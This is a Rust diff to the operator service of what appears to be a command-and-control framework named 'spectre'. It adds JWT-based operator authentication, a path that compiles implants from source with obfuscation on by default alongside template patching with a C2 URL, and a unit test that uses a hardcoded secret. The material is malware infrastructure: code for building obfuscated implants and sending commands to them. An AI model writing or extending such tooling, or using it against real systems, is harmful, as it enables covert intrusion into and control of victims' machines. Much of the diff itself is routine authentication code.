@@ -19,6 +19,27 @@ pub struct OperatorServiceImpl {
     pub sessions: Arc<SessionManager>,
 }
 
+fn extract_operator_id<T>(req: &Request<T>) -> Result<String, Status> {
+    let auth_header = req
+        .metadata()
+        .get("authorization")
+        .ok_or_else(|| Status::unauthenticated("Missing authorization header"))?;
+
+    let auth_str = auth_header
+        .to_str()
+        .map_err(|_| Status::unauthenticated("Invalid authorization header"))?;
+
+    if !auth_str.starts_with("Bearer ") {
+        return Err(Status::unauthenticated("Invalid authorization scheme"));
+    }
+
+    let token = &auth_str[7..];
+    let claims = crate::utils::verify_jwt(token)
+        .map_err(|e| Status::unauthenticated(format!("Invalid token: {}", e)))?;
+
+    Ok(claims.sub)
+}
+
 #[tonic::async_trait]
 impl OperatorService for OperatorServiceImpl {
     type StreamEventsStream = tokio_stream::wrappers::ReceiverStream<Result<Event, Status>>;
@@ -341,6 +362,7 @@ impl OperatorService for OperatorServiceImpl {
         &self,
         req: Request<SendCommandRequest>,
     ) -> Result<Response<Command>, Status> {
+        let operator_id = extract_operator_id(&req)?;
         let req = req.into_inner();
         let implant_id = uuid::Uuid::parse_str(&req.implant_id)
             .map_err(|_| Status::invalid_argument("Invalid UUID"))?;
@@ -362,11 +384,6 @@ impl OperatorService for OperatorServiceImpl {
                 true,
             )
             .await;
-
-        // Note: operator_id should be extracted from authenticated gRPC metadata
-        // via interceptor middleware in a production deployment. For now, use "system"
-        // as a placeholder indicating no authenticated operator context available.
-        let operator_id = "system".to_string();
 
         Ok(Response::new(Command {
             id: cmd_id.to_string(),
@@ -706,14 +723,31 @@ impl OperatorService for OperatorServiceImpl {
         let output_dir = std::env::temp_dir();
         let output_path = output_dir.join(format!("spectre_{}.bin", uuid::Uuid::new_v4()));
 
-        // Builder
-        crate::builder::Builder::patch_implant(
-            &template_path,
-            &output_path,
-            &req.c2_url,
-            req.sleep_interval as u64,
-        )
-        .map_err(|e| Status::internal(format!("Build failed: {}", e)))?;
+        // Builder Logic: Compile from source if requested, otherwise patch template
+        if req.platform == "linux-src" || req.platform == "windows-src" {
+            // Assume source is available relative to CWD
+            let source_dir = std::path::Path::new("../spectre-implant");
+            if !source_dir.exists() {
+                return Err(Status::failed_precondition("Implant source code not found"));
+            }
+            
+            crate::builder::Builder::compile_implant(
+                source_dir,
+                &output_path,
+                &req.c2_url,
+                &[], // No special features
+                true // Obfuscate by default
+            ).map_err(|e| Status::internal(format!("Compilation failed: {}", e)))?;
+        } else {
+            // Patch existing template
+            crate::builder::Builder::patch_implant(
+                &template_path,
+                &output_path,
+                &req.c2_url,
+                req.sleep_interval as u64,
+            )
+            .map_err(|e| Status::internal(format!("Build failed: {}", e)))?;
+        }
 
         // Stream back
         let (tx, rx) = tokio::sync::mpsc::channel(4);
@@ -743,5 +777,29 @@ impl OperatorService for OperatorServiceImpl {
         Ok(Response::new(tokio_stream::wrappers::ReceiverStream::new(
             rx,
         )))
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use tonic::metadata::MetadataValue;
+    use std::str::FromStr;
+
+    #[test]
+    fn test_extract_operator_id_success() {
+        unsafe {
+            std::env::set_var("JWT_SECRET", "test_secret_key_must_be_long_enough_32_chars");
+        }
+        
+        let user_id = "550e8400-e29b-41d4-a716-446655440000";
+        let token = crate::utils::create_jwt(user_id, "admin").unwrap();
+        
+        let mut req = Request::new(());
+        let val = MetadataValue::from_str(&format!("Bearer {}", token)).unwrap();
+        req.metadata_mut().insert("authorization", val);
+
+        let extracted = extract_operator_id(&req).unwrap();
+        assert_eq!(extracted, user_id);
     }
 }
